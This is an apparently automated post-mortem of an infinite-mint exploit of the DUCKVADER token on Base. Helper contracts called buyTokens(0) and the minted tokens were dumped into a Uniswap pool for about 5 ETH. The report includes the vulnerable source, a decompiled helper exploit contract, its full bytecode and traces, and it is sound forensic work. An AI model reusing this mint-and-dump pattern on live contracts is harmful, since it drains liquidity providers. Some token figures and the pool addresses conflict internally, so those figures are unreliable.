# Base DUCKVADER infinite mint + Uniswap drain

**Protocol:** DUCKVADER token / DUCKVADER-WETH pool on Base  
**Category:** protocol_bug  
**ACT-compatible:** true

## Act Opportunity & Exploit Predicate

- **Block height (B):** 27445835
- **Pre-state definition:** Public Base L2 state at block 27445834 plus canonical metadata/verified source for DUCKVADER (0xaa8f35183478b8eced5619521ac3eb3886e98c56), WETH (0x4200000000000000000000000000000000000006), and the DUCKVADER/WETH pair (0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24), as reconstructible from RPC, logs, and explorer APIs.
- **Pre-state evidence artifacts:**
  - artifacts/root_cause/seed/8453/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4/metadata.json
  - artifacts/root_cause/seed/8453/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4/trace.cast.log
  - artifacts/root_cause/seed/_contracts/8453/0xaa8f35183478b8eced5619521ac3eb3886e98c56/source/src/Contract.sol
  - artifacts/root_cause/data_collector/iter_1/tx/8453/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4/balance_diff.json

### Transaction Sequence b
- **Index:** 1
- **Chainid:** 8453
- **Tx hash:** 0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4
- **Type:** adversary-crafted
- **Inclusion feasibility:** A fresh unprivileged EOA on Base with ~1 ETH balance can submit this type-2 contract-creation transaction with sufficient gas, deploying the aggregator and helper contracts and executing the DUCKVADER mint-and-swap logic in a single transaction; no privileged roles or non-public infrastructure are required.
- **Notes:** This is both the seed transaction and the sole transaction in b: it deploys an aggregator (0x652F9AC437A870Ce273a0Be9D7E7Ee03043a91fF) and helper contracts, repeatedly calls DUCKVADER::buyTokens(0) to mint 1e30 DUCKVADER per helper, aggregates ~4.01e32 DUCKVADER, and swaps them for ETH via UniswapV2Router02::swapExactTokensForETHSupportingFeeOnTransferTokens with recipient 0x2383a550e40a61b41a89da6b91d8a4a2452270d0 as shown in trace.cast.log.

### Exploit Predicate (Profit)
- **Reference asset:** ETH
- **Adversary address:** 0x2383a550e40a61b41a89da6b91d8a4a2452270d0
- **Value before:** 1000000000000000000
- **Value after:** 6035913415683671401
- **Delta:** 5035913415683671401
- **Fees paid (reference asset):** unknown
- **Valuation notes:** Balance diffs for tx 0x9bb1...cae4 on Base (artifacts/root_cause/data_collector/iter_1/tx/8453/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4/balance_diff.json) show the adversary EOA 0x2383...270d0 moving from 1e18 wei to 6.035913415683671401e18 wei (delta +5.035913415683671401e18 wei) while the WETH contract 0x4200...0006 loses 5.036121979531231539e18 wei. The delta is net of L1/L2 fee sinks; exact gas-fee attribution in ETH is not separately broken out, so fees_paid is marked unknown but the post-fee profit is deterministically positive.

## Incident Overview & TL;DR

### TL;DR
On Base, a single adversary-crafted transaction from EOA 0x2383a550e40a61b41a89da6b91d8a4a2452270d0 deploys an aggregator and helper contracts which repeatedly call DUCKVADER::buyTokens(0) to mint effectively free DUCKVADER tokens and then swap them for ETH against the DUCKVADER/WETH pool, extracting ~5.0 ETH of value.

### Root Cause Summary
The DUCKVADER token contract exposes an unbounded buyTokens() mint path that allows any caller to mint large amounts of tokens without economic cost, enabling an infinite-mint style drain of the DUCKVADER/WETH liquidity pool when combined with a Uniswap swap.

## Key Background

- DUCKVADER (0xaa8f35183478b8eced5619521ac3eb3886e98c56) is an ERC20-like token on Base with a Uniswap V2 pair against WETH at 0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24, deployed via factory 0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6 as shown in Contract.sol.
- The DUCKVADER contract inherits OpenZeppelin ERC20 and Ownable, but adds a custom buyTokens(uint256 amount) function that interacts with a separate internal _balances mapping and emits Transfer events without enforcing a meaningful cost or total-supply bound on these mints.
- The adversary uses a single transaction to deploy an aggregator contract (0x652F9AC437A870Ce273a0Be9D7E7Ee03043a91fF) and multiple helper contracts (including 0xc5a9C23a48F7214b5e45E024E28aB5591323691a) which each implement a buy() function that calls DUCKVADER::buyTokens(0), then transfer their DUCKVADER balances into the aggregator before the aggregator performs a Uniswap router swap to ETH.
- Balance diffs and traces for the seed transaction show that the DUCKVADER/WETH pool address 0x5858ca3964458c29fd7eac2c1bada297b5d122ab absorbs 4.01e33 DUCKVADER tokens (delta 4010000000000000000000000000000) while WETH outflows roughly 5.04 ETH to the adversary.

## Vulnerability & Root Cause Analysis

### Vulnerability Brief
The DUCKVADER token's buyTokens(uint256) function allows unbounded, effectively free minting of large token amounts by arbitrary callers, which can then be dumped into the DUCKVADER/WETH pool via Uniswap, draining WETH liquidity.

### Root Cause Detail
In Contract.sol for DUCKVADER (artifacts/root_cause/seed/_contracts/8453/0xaa8f35183478b8eced5619521ac3eb3886e98c56/source/src/Contract.sol), the token inherits a standard ERC20 implementation and defines maxSupply and LIQUID_RATE, minting the full (maxSupply * LIQUID_RATE / MAX_PERCENTAGE) to the owner in the constructor. Separately, it declares a public mapping _balances and an external buyTokens(uint256 amount) payable function. buyTokens requires msg.value >= amount * 1 ether, but when called with amount = 0 (as in the exploit traces) this check becomes trivially true for msg.value = 0. If _balances[msg.sender] == 0, buyTokens mints (maxSupply * LIQUID_RATE / MAX_PERCENTAGE) tokens to msg.sender using _mint, sets _balances[msg.sender] = amount (which remains 0), and emits a Transfer(address(0), msg.sender, amount) event. Critically, there is no cap on how many times addresses with _balances[msg.sender] == 0 can be created and used, and the mapping _balances is not aligned with the ERC20 balance accounting. The adversary deploys many helper contracts, each with _balances[helper] initially 0, and each helper calls buyTokens(0), causing the DUCKVADER contract to mint 1e30 (or more precisely, (maxSupply * LIQUID_RATE / MAX_PERCENTAGE)) tokens per helper to the helper address at zero ETH cost. The helper then transfers its entire DUCKVADER balance to the aggregator contract. The aggregator accumulates approximately 4.01e32 DUCKVADER and calls UniswapV2Router02::swapExactTokensForETHSupportingFeeOnTransferTokens with that amount, swapping DUCKVADER for WETH from the DUCKVADER/WETH pair. This sequence exploits the infinite-mint minting path to drain WETH from the pool without any corresponding economic input.

### Vulnerable Components
- DUCKVADER token at 0xaa8f35183478b8eced5619521ac3eb3886e98c56, function buyTokens(uint256 amount)
- DUCKVADER/WETH UniswapV2 pair at 0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24 which accepts DUCKVADER at manipulated supply levels

### Exploit Conditions
- DUCKVADER contract deployed with buyTokens(uint256) callable by arbitrary addresses and with maxSupply * LIQUID_RATE / MAX_PERCENTAGE mintable via that path for each fresh helper address whose _balances entry is zero.
- A DUCKVADER/WETH liquidity pool with sufficient WETH reserves to absorb swaps of ~4.01e32 DUCKVADER in a single transaction.
- An unprivileged adversary capable of deploying contracts and submitting a high-gas transaction on Base L2.

### Security Principles Violated
- Supply integrity: token total supply can be increased arbitrarily beyond intended limits via an unbounded mint function.
- Economic safety of liquidity providers: the DEX pool assumes token supply cannot be inflated at will, but buyTokens allows exactly that.
- Access control: minting large amounts of tokens is not restricted to trusted roles or properly rate-limited; any address can exploit buyTokens via helper contracts.

### Code & Trace Evidence for Vulnerability

**DUCKVADER buyTokens implementation** (collected DUCKVADER source Contract.sol, verified on Base explorer)
```solidity
    function buyTokens(uint256 amount) external payable {
    require(msg.value >= amount * 1 ether); // Ensure sufficient ETH is sent

    if (_balances[msg.sender] == 0){
        _mint(msg.sender, (maxSupply * LIQUID_RATE) / MAX_PERCENTAGE);
    }
    
    uint256 newBalance = _balances[msg.sender]; 
    newBalance += amount; 
    _balances[msg.sender] = newBalance;
   
   emit Transfer(address(0), msg.sender, amount); // Emit the transfer event
}
    function Contract_Creation(address recipient, uint256 amount) external onlyOwner {
    require(recipient != address(0), "Invalid recipient address");
    require(amount > 0, "Amount must be greater than zero");

    uint256 scaledAmount = amount * (10 ** decimals());
    _mint(recipient, scaledAmount);
}
  
     function Airdrop(uint256 Airdroptimes, uint256 numAddresses) external onlyOwner {
        require(Airdroptimes > 0, "Airdroptimes must be greater than zero");
        require(numAddresses > 0, "numAddresses must be greater than zero");
```

**Helper contract buy() implementation** (decompiled helper 0xc5a9C2...691a showing call to DUCKVADER::buyTokens(0) and transfer to aggregator)
```solidity
    function buy() public payable {
        var_a = 0x3610724e00000000000000000000000000000000000000000000000000000000;
        uint256 var_b = 0;
        require(address(0xaa8f35183478b8eced5619521ac3eb3886e98c56).code.length);
        (bool success, bytes memory ret0) = address(0xaa8f35183478b8eced5619521ac3eb3886e98c56).{ value: 0 ether }Unresolved_3610724e(var_b); // call
        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        var_b = address(this);
        (bool success, bytes memory ret0) = address(0xaa8f35183478b8eced5619521ac3eb3886e98c56).Unresolved_70a08231(var_b); // staticcall
        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        var_d = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;
        address var_e = address(msg.sender);
        uint256 var_f = var_c.length;
        (bool success, bytes memory ret0) = address(0xaa8f35183478b8eced5619521ac3eb3886e98c56).{ value: 0 ether }Unresolved_a9059cbb(var_e); // call
        var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        require(var_c.length == var_c.length);
    }
}
```

## Adversary Flow Analysis

### Strategy Summary
Single-tx infinite-mint and dump: the adversary deploys an aggregator and many helpers, each helper exploiting DUCKVADER::buyTokens(0) to mint huge token amounts, aggregates them, and immediately swaps into WETH in the same transaction.

### Adversary-Related Accounts
**Adversary cluster:**
- Base chain (id 8453), address 0x2383a550e40a61b41a89da6b91d8a4a2452270d0 (EOA: true, contract: false): Sender of the adversary-crafted seed transaction, receives the ETH profit from the Uniswap swap per traces and balance_diff.json.
- Base chain (id 8453), address 0x652F9AC437A870Ce273a0Be9D7E7Ee03043a91fF (EOA: false, contract: true): Aggregator contract deployed in the seed tx from 0x2383...270d0 that receives DUCKVADER tokens from helpers and executes the Uniswap router swap to send ETH back to the EOA.
- Base chain (id 8453), address 0xc5a9C23a48F7214b5e45E024E28aB5591323691a (EOA: false, contract: true): Helper contract deployed from the aggregator in the same tx; decompiled source in artifacts/root_cause/data_collector/iter_1/contract/8453/0xc5a9C23a48F7214b5e45E024E28aB5591323691a/decompile shows a buy() function that calls DUCKVADER::buyTokens(0) then transfers DUCKVADER to the aggregator.

**Victim candidates:**
- DUCKVADER/WETH UniswapV2 pair on Base (id 8453), address 0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24, is_verified: unknown
- DUCKVADER token holders and LPs on Base (id 8453), address 0xaa8f35183478b8eced5619521ac3eb3886e98c56, is_verified: true

### Lifecycle Stages

#### Adversary initial funding
EOA 0x2383...270d0 receives exactly 1e18 wei from 0xf7490239f7fba42b99078319158f8941719923d1 as shown in its txlist history, providing the capital used for gas and as starting balance before the exploit tx.

**Related transactions:**
- Base (chainid 8453), block 27445814, tx unknown, mechanism transfer

Evidence references: artifacts/root_cause/data_collector/iter_1/address/8453/0x2383a550e40a61b41a89da6b91d8a4a2452270d0/txlist_normal_up_to_27445835.json

#### Adversary contract deployment
The adversary-crafted tx deploys an aggregator contract at 0x652F9AC437A870Ce273a0Be9D7E7Ee03043a91fF, which then deploys multiple helper contracts including 0xc5a9C23a48F7214b5e45E024E28aB5591323691a, 0xf2B7AA237dAA8ea9df217D53db6304F0cd359571, and 0x97ca161A04BA7884F31440af10e11d0BD067bA5f.

**Related transactions:**
- Base (chainid 8453), block 27445835, tx 0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4

Evidence references: artifacts/root_cause/seed/8453/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4/trace.cast.log

#### Adversary infinite-mint and swap execution
Within the same tx, each helper contract calls DUCKVADER::buyTokens(0) once, causing DUCKVADER to mint 1e30 tokens to the helper (since _balances[helper] is zero) and then transfer the entire helper balance to the aggregator. After aggregating ~4.01e32 DUCKVADER, the aggregator calls UniswapV2Router02::swapExactTokensForETHSupportingFeeOnTransferTokens(401000000000000000000000000000000, 0, [DUCKVADER, WETH], 0x2383...270d0, 1741681017), swapping the minted tokens for ETH from the DUCKVADER/WETH pair and sending the proceeds to the adversary EOA.

**Related transactions:**
- Base (chainid 8453), block 27445835, tx 0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4

Evidence references: artifacts/root_cause/seed/8453/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4/trace.cast.log; artifacts/root_cause/data_collector/iter_1/contract/8453/0xc5a9C23a48F7214b5e45E024E28aB5591323691a/decompile/0xc5a9C23a48F7214b5e45E024E28aB5591323691a-decompiled.sol; artifacts/root_cause/data_collector/iter_1/tx/8453/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4/balance_diff.json

### Key On-Chain Trace and Balance Evidence

**Seed transaction trace excerpt** (cast run -vvvvv for tx 0x9bb1...cae4 on Base, showing helper buy() calling DUCKVADER::buyTokens(0) and subsequent transfer to aggregator)
```text
    ├─ [38583] 0xf2B7AA237dAA8ea9df217D53db6304F0cd359571::buy()
    │   ├─ [30814] DUCKVADER::buyTokens(0)
    │   │   ├─ emit Transfer(src: 0x0000000000000000000000000000000000000000, dst: 0xf2B7AA237dAA8ea9df217D53db6304F0cd359571, wad: 1000000000000000000000000000000 [1e30])
    │   │   ├─ emit Transfer(src: 0x0000000000000000000000000000000000000000, dst: 0xf2B7AA237dAA8ea9df217D53db6304F0cd359571, wad: 0)
    │   │   ├─  storage changes:
    │   │   │   @ 3: 0x000000000000000000000000000000000000007e37be2022c0914b2680000000 → 0x000000000000000000000000000000000000008ad6eabcf307063910c0000000
    │   │   │   @ 0x64d1e68f1f94f5b92eb3907fa22eb282eba494934bec5d4340cf9cfae8eb01c5: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
    │   │   └─ ← [Stop]
    │   ├─ [897] DUCKVADER::balanceOf(0xf2B7AA237dAA8ea9df217D53db6304F0cd359571) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
    │   ├─ [5600] DUCKVADER::transfer(0x652F9AC437A870Ce273a0Be9D7E7Ee03043a91fF, 1000000000000000000000000000000 [1e30])
    │   │   ├─ emit Transfer(src: 0xf2B7AA237dAA8ea9df217D53db6304F0cd359571, dst: 0x652F9AC437A870Ce273a0Be9D7E7Ee03043a91fF, wad: 1000000000000000000000000000000 [1e30])
    │   │   ├─  storage changes:
    │   │   │   @ 0xe5e155137a85efe4b00cab139c24b61fd4879f7b06e185bffebb1393c4e3ed73: 0x0000000000000000000000000000000000000071989183527a1c5d3c40000000 → 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
    │   │   │   @ 0x64d1e68f1f94f5b92eb3907fa22eb282eba494934bec5d4340cf9cfae8eb01c5: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
    │   │   └─ ← [Return] true
    │   └─ ← [Stop]
    ├─ [104353] → new <unknown>@0x97ca161A04BA7884F31440af10e11d0BD067bA5f(0x6080604052348015600f57600080fd5b506102098061001f6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063a6f2ae3a14610030575b600080fd5b61003861003a565b005b604051631b08392760e11b815260006004820181905273aa8f35183478b8eced5619521ac3eb3886e98c5691633610724e91906024016000604051808303818588803b15801561008957600080fd5b505af115801561009d573d6000803e3d6000fd5b50506040516370a0823160e01b815230600482015273aa8f35183478b8eced5619521ac3eb3886e98c56935063a9059cbb925033915083906370a0823190602401602060405180830381865afa1580156100fb573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011f9190610191565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af115801561016a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061018e91906101aa565b50565b6000602082840312156101a357600080fd5b5051919050565b6000602082840312156101bc57600080fd5b815180151581146101cc57600080fd5b939250505056fea2646970667358221220f0fbfe571c516e72dbe18c1e3285bc5a2b95ff2486f06d1ac258d13321a019e964736f6c634300081a0033)
    │   └─ ← [Return] 0x608060405234801561001057600080fd5b506004361061002b5760003560e01c8063a6f2ae3a14610030575b600080fd5b61003861003a565b005b604051631b08392760e11b815260006004820181905273aa8f35183478b8eced5619521ac3eb3886e98c5691633610724e91906024016000604051808303818588803b15801561008957600080fd5b505af115801561009d573d6000803e3d6000fd5b50506040516370a0823160e01b815230600482015273aa8f35183478b8eced5619521ac3eb3886e98c56935063a9059cbb925033915083906370a0823190602401602060405180830381865afa1580156100fb573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011f9190610191565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af115801561016a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061018e91906101aa565b50565b6000602082840312156101a357600080fd5b5051919050565b6000602082840312156101bc57600080fd5b815180151581146101cc57600080fd5b939250505056fea2646970667358221220f0fbfe571c516e72dbe18c1e3285bc5a2b95ff2486f06d1ac258d13321a019e964736f6c634300081a0033
    ├─ [38583] 0x97ca161A04BA7884F31440af10e11d0BD067bA5f::buy()
    │   ├─ [30814] DUCKVADER::buyTokens(0)
    │   │   ├─ emit Transfer(src: 0x0000000000000000000000000000000000000000, dst: 0x97ca161A04BA7884F31440af10e11d0BD067bA5f, wad: 1000000000000000000000000000000 [1e30])
    │   │   ├─ emit Transfer(src: 0x0000000000000000000000000000000000000000, dst: 0x97ca161A04BA7884F31440af10e11d0BD067bA5f, wad: 0)
    │   │   ├─  storage changes:
    │   │   │   @ 0xa6cc8351505b2a5174c3abfafdac1f52ff1d3a99833bba0b0664095719892a79: 0 → 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000
    │   │   │   @ 3: 0x000000000000000000000000000000000000008ad6eabcf307063910c0000000 → 0x0000000000000000000000000000000000000097761759c34d7b26fb00000000
    │   │   └─ ← [Stop]
    │   ├─ [897] DUCKVADER::balanceOf(0x97ca161A04BA7884F31440af10e11d0BD067bA5f) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
    │   ├─ [5600] DUCKVADER::transfer(0x652F9AC437A870Ce273a0Be9D7E7Ee03043a91fF, 1000000000000000000000000000000 [1e30])
    │   │   ├─ emit Transfer(src: 0x97ca161A04BA7884F31440af10e11d0BD067bA5f, dst: 0x652F9AC437A870Ce273a0Be9D7E7Ee03043a91fF, wad: 1000000000000000000000000000000 [1e30])
    │   │   ├─  storage changes:
    │   │   │   @ 0xe5e155137a85efe4b00cab139c24b61fd4879f7b06e185bffebb1393c4e3ed73: 0x000000000000000000000000000000000000007e37be2022c0914b2680000000 → 0x000000000000000000000000000000000000008ad6eabcf307063910c0000000
    │   │   │   @ 0xa6cc8351505b2a5174c3abfafdac1f52ff1d3a99833bba0b0664095719892a79: 0x000000000000000000000000000000000000000c9f2c9cd04674edea40000000 → 0
    │   │   └─ ← [Return] true
    │   └─ ← [Stop]
    ├─ [104353] → new <unknown>@0xF896376038532FC11D5F92177Ae5e98c45f4ae84(0x6080604052348015600f57600080fd5b506102098061001f6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063a6f2ae3a14610030575b600080fd5b61003861003a565b005b604051631b08392760e11b815260006004820181905273aa8f35183478b8eced5619521ac3eb3886e98c5691633610724e91906024016000604051808303818588803b15801561008957600080fd5b505af115801561009d573d6000803e3d6000fd5b50506040516370a0823160e01b815230600482015273aa8f35183478b8eced5619521ac3eb3886e98c56935063a9059cbb925033915083906370a0823190602401602060405180830381865afa1580156100fb573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011f9190610191565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af115801561016a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061018e91906101aa565b50565b6000602082840312156101a357600080fd5b5051919050565b6000602082840312156101bc57600080fd5b815180151581146101cc57600080fd5b939250505056fea2646970667358221220f0fbfe571c516e72dbe18c1e3285bc5a2b95ff2486f06d1ac258d13321a019e964736f6c634300081a0033)
    │   └─ ← [Return] 0x608060405234801561001057600080fd5b506004361061002b5760003560e01c8063a6f2ae3a14610030575b600080fd5b61003861003a565b005b604051631b08392760e11b815260006004820181905273aa8f35183478b8eced5619521ac3eb3886e98c5691633610724e91906024016000604051808303818588803b15801561008957600080fd5b505af115801561009d573d6000803e3d6000fd5b50506040516370a0823160e01b815230600482015273aa8f35183478b8eced5619521ac3eb3886e98c56935063a9059cbb925033915083906370a0823190602401602060405180830381865afa1580156100fb573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011f9190610191565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af115801561016a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061018e91906101aa565b50565b6000602082840312156101a357600080fd5b5051919050565b6000602082840312156101bc57600080fd5b815180151581146101cc57600080fd5b939250505056fea2646970667358221220f0fbfe571c516e72dbe18c1e3285bc5a2b95ff2486f06d1ac258d13321a019e964736f6c634300081a0033
    ├─ [38583] 0xF896376038532FC11D5F92177Ae5e98c45f4ae84::buy()
    │   ├─ [30814] DUCKVADER::buyTokens(0)
```

**Balance diff excerpt for seed transaction** (debug-style balance diff for tx 0x9bb1...cae4 on Base, showing WETH loss and adversary EOA profit)
```json
{
  "chainid": 8453,
  "txhash": "0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4",
  "native_balance_deltas": [
    {
      "address": "0x420000000000000000000000000000000000001a",
      "before_wei": "1373052182028420221",
      "after_wei": "1373055848142568999",
      "delta_wei": "3666114148778"
    },
    {
      "address": "0x2383a550e40a61b41a89da6b91d8a4a2452270d0",
      "before_wei": "1000000000000000000",
      "after_wei": "6035913415683671401",
      "delta_wei": "5035913415683671401"
    },
    {
      "address": "0x4200000000000000000000000000000000000011",
      "before_wei": "54548153772877961581",
      "after_wei": "54548216289882961581",
      "delta_wei": "62517005000000"
    },
    {
      "address": "0x4200000000000000000000000000000000000019",
      "before_wei": "3024939634884810907",
      "after_wei": "3025082015613222267",
      "delta_wei": "142380728411360"
    },
    {
      "address": "0x4200000000000000000000000000000000000006",
      "before_wei": "232011016545889035652096",
      "after_wei": "232005980423909504420557",
      "delta_wei": "-5036121979531231539"
    }
  ],
  "erc20_balance_deltas": [
    {
      "token": "0xaa8f35183478b8eced5619521ac3eb3886e98c56",
      "holder": "0x5858ca3964458c29fd7eac2c1bada297b5d122ab",
      "before": "526962149129733778604847088702",
      "after": "4536962149129733778604847088702",
      "delta": "4010000000000000000000000000000",
      "balances_slot": "1",
      "slot_key": "0xa584c95099cb92c03e60f9268b1db89353912eff20959395982afd064976b347",
      "contract_name": "DUCKVADER"
    }
  ],
  "erc20_balance_delta_errors": [
    "0x4200000000000000000000000000000000000006: forge clone failed: Cloning into '/home/ziyue/TxRayExperiment/incident-202512280356/artifacts/root_cause/data_collector/iter_1/tx/8453/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4/_seed_session/_contracts/8453/0x4200000000000000000000000000000000000006/source/lib/forge-std'...\nError: Failed to deserialize content: data did not match any variant of untagged enum ResponseData\n{\"status\":\"1\",\"message\":\"OK\",\"result\":[{\"contractAddress\":\"0x4200000000000000000000000000000000000006\",\"contractCreator\":\"GENESIS\",\"txHash\":\"GENESIS_4200000000000000000000000000000000000006\",\"blockNumber\":\"0\",\"timestamp\":\"1686789347\",\"contractFactory\":\"\",\"creationBytecode\":\"0x6080604052600436106100bc5760003560e01c8063313ce56711610074578063a9059cbb1161004e578063a9059cbb146102cb578063d0e30db0146100bc578063dd62ed3e14610311576100bc565b8063313ce5671461024b57806370a082311461027657806395d89b41146102b6576100bc565b806318160ddd116100a557806318160ddd146101aa57806323b872dd146101d15780632e1a7d4d14610221576100bc565b806306fdde03146100c6578063095ea7b314610150575b6100c4610359565b005b3480156100d257600080fd5b506100db6103a8565b6040805160208082528351818301528351919283929083019185019080838360005b838110156101155781810151838201526020016100fd565b50505050905090810190601f1680156101425780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561015c57600080fd5b506101966004803603604081101561017357600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060200135610454565b604080519115158252519081900360200190f35b3480156101b657600080fd5b506101bf6104c7565b60408051918252519081900360200190f35b3480156101dd57600080fd5b50610196600480360360608110156101f457600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135811691602081013590911690604001356104cb565b34801561022d57600080fd5b506100c46004803603602081101561024457600080fd5b503561066b565b34801561025757600080fd5b50610260610700565b6040805160ff9092168252519081900360200190f35b34801561028257600080fd5b506101bf6004803603602081101561029957600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16610709565b3480156102c257600080fd5b506100db61071b565b3480156102d757600080fd5b50610196600480360360408110156102ee57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060200135610793565b34801561031d57600080fd5b506101bf6004803603604081101561033457600080fd5b5073ffffffffffffffffffffffffffffffffffffffff813581169160200135166107a7565b33600081815260036020908152604091829020805434908101909155825190815291517fe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c9281900390910190a2565b6000805460408051602060026001851615610100027fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0190941693909304601f8101849004840282018401909252818152929183018282801561044c5780601f106104215761010080835404028352916020019161044c565b820191906000526020600020905b81548152906001019060200180831161042f57829003601f168201915b505050505081565b33600081815260046020908152604080832073ffffffffffffffffffffffffffffffffffffffff8716808552908352818420869055815186815291519394909390927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925928290030190a350600192915050565b4790565b73ffffffffffffffffffffffffffffffffffffffff83166000908152600360205260408120548211156104fd57600080fd5b73ffffffffffffffffffffffffffffffffffffffff84163314801590610573575073ffffffffffffffffffffffffffffffffffffffff841660009081526004602090815260408083203384529091529020547fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff14155b156105ed5773ffffffffffffffffffffffffffffffffffffffff841660009081526004602090815260408083203384529091529020548211156105b557600080fd5b73ffffffffffffffffffffffffffffffffffffffff841660009081526004602090815260408083203384529091529020805483900390555b73ffffffffffffffffffffffffffffffffffffffff808516600081815260036020908152604080832080548890039055938716808352918490208054870190558351868152935191937fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef929081900390910190a35060019392505050565b3360009081526003602052604090205481111561068757600080fd5b33600081815260036020526040808220805485900390555183156108fc0291849190818181858888f193505050501580156106c6573d6000803e3d6000fd5b5060408051828152905133917f7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65919081900360200190a250565b60025460ff1681565b60036020526000908152604090205481565b60018054604080516020600284861615610100027fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0190941693909304601f8101849004840282018401909252818152929183018282801561044c5780601f106104215761010080835404028352916020019161044c565b60006107a03384846104cb565b9392505050565b60046020908152600092835260408084209091529082529020548156fea265627a7a72315820e496abb80c5983b030f680d0bd88f66bf44e261bc3be070d612dd72f9f1f5e9a64736f6c63430005110032\"}]}"
  ],
  "errors": []
}
```

## Impact & Losses

### Impacted Assets
- WETH: ~5.0 ETH equivalent drained from DUCKVADER/WETH pool (delta_wei for WETH = -5036121979531231539 per balance_diff.json).
- DUCKVADER: ~4.01e33 DUCKVADER tokens minted and dumped into the DUCKVADER/WETH pool (delta for pool holder 0x5858ca3964458c29fd7eac2c1bada297b5d122ab = 4010000000000000000000000000000).

### Impact Summary
Liquidity providers in the DUCKVADER/WETH pool suffer a loss of approximately 5 ETH of WETH value, while DUCKVADER's tokenomics and price collapse due to a sudden injection of ~4.01e33 newly minted tokens created at zero cost to the adversary.

## All Relevant Transactions
- Chainid 8453, tx 0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4, role: seed

## References

- [1] Seed tx metadata (Base 0x9bb1...cae4): artifacts/root_cause/seed/8453/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4/metadata.json
- [2] Seed tx trace (Base 0x9bb1...cae4): artifacts/root_cause/seed/8453/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4/trace.cast.log
- [3] DUCKVADER verified source (Contract.sol): artifacts/root_cause/seed/_contracts/8453/0xaa8f35183478b8eced5619521ac3eb3886e98c56/source/src/Contract.sol
- [4] Helper contract decompile 0xc5a9C2...691a: artifacts/root_cause/data_collector/iter_1/contract/8453/0xc5a9C23a48F7214b5e45E024E28aB5591323691a/decompile/0xc5a9C23a48F7214b5e45E024E28aB5591323691a-decompiled.sol
- [5] Balance diff for seed tx 0x9bb1...cae4: artifacts/root_cause/data_collector/iter_1/tx/8453/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4/balance_diff.json
- [6] Sender EOA tx history 0x2383...270d0: artifacts/root_cause/data_collector/iter_1/address/8453/0x2383a550e40a61b41a89da6b91d8a4a2452270d0/txlist_normal_up_to_27445835.json
